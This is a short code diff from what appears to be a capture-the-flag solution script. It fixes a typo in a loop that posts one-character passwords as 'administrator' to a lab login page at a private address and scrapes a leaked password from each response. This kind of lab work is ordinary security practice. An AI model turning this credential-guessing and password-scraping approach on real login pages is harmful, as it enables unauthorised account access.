@@ -9,7 +9,7 @@ def get_password_from_content(content):
     return content.split("find your password: ")[1].split("<")[0]
 
 for character in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_+!{}":
-    passwords.append(get_password_from_content(rrequests.post("http://192.168.40.8/PW/challenge11/login.php", data={
+    passwords.append(get_password_from_content(requests.post("http://192.168.40.8/PW/challenge11/login.php", data={
         'username': 'administrator',
         'password': character
     }).content))
